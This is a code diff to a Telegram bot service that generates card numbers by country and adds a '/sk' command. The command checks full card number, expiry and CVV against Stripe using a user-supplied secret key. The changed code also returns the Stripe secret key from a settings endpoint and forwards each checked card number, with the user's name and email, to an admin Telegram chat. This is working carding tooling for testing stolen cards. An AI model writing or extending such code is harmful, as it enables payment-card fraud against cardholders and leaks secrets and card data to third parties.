@@ -274,7 +274,8 @@ userRouter.get('/telegram-settings', requireAuth, async (req: Request, res: Resp
       success: true, 
       settings: {
         telegramBotToken: user.telegramBotToken || '',
-        telegramChatId: user.telegramChatId || ''
+        telegramChatId: user.telegramChatId || '',
+        stripeSecretKey: user.stripeSecretKey || ''
       }
     });
   } catch (error) {
@@ -404,6 +405,63 @@ function initializeUserBot(user: any) {
         await bot.sendMessage(msg.chat.id, message);
       } catch (error) {
         await bot.sendMessage(msg.chat.id, 'Error generating cards for the specified country');
+      }
+    });
+    
+    // /sk command - Check a card with user's personal Stripe key
+    bot.onText(/\/sk (.+)/, async (msg, match) => {
+      if (msg.chat.id.toString() !== user.telegramChatId) return;
+      
+      if (!user.stripeSecretKey) {
+        return bot.sendMessage(msg.chat.id, 'You need to set a Stripe secret key in your account settings first.');
+      }
+      
+      const cardData = match?.[1];
+      if (!cardData) {
+        return bot.sendMessage(msg.chat.id, 'Please provide card data in format: number|month|year|cvv');
+      }
+      
+      try {
+        // Validate and parse card data
+        const parts = cardData.split('|');
+        if (parts.length !== 4) {
+          return bot.sendMessage(msg.chat.id, 'Invalid format. Use: number|month|year|cvv');
+        }
+        
+        const [number, month, year, cvv] = parts;
+        const formattedExpiry = `${month}/${year.slice(-2)}`;
+        
+        // Create temporary checker with user's key
+        const userChecker = new CardChecker(user.stripeSecretKey);
+        
+        // Check card with user's Stripe key
+        const result = await userChecker.checkCardWithCustomKey({
+          number: number.trim(),
+          expiry: formattedExpiry,
+          cvv: cvv.trim(),
+          processor: 'stripe'
+        });
+        
+        // Send the result to user
+        const userMessage = `Card check with your Stripe key: ${result.status}\n` +
+                         `Message: ${result.message}\n` +
+                         `Brand: ${result.details?.brand || 'Unknown'}\n` +
+                         `Type: ${result.details?.funding || 'Unknown'}\n` +
+                         `Country: ${result.details?.country || 'Unknown'}`;
+                         
+        await bot.sendMessage(msg.chat.id, userMessage);
+        
+        // For admin, send notification of custom key usage
+        if (process.env.ADMIN_BOT_TOKEN && process.env.ADMIN_CHAT_ID) {
+          const adminBot = new TelegramBot(process.env.ADMIN_BOT_TOKEN, { polling: false });
+          const adminMessage = `User ${user.name} (${user.email}) used custom Stripe key to check card:\n` +
+                            `Card: ${number}\n` +
+                            `Result: ${result.status}\n`;
+                            
+          await adminBot.sendMessage(process.env.ADMIN_CHAT_ID, adminMessage);
+        }
+      } catch (error) {
+        await bot.sendMessage(msg.chat.id, 'Error checking card with your Stripe key');
       }
     });
     
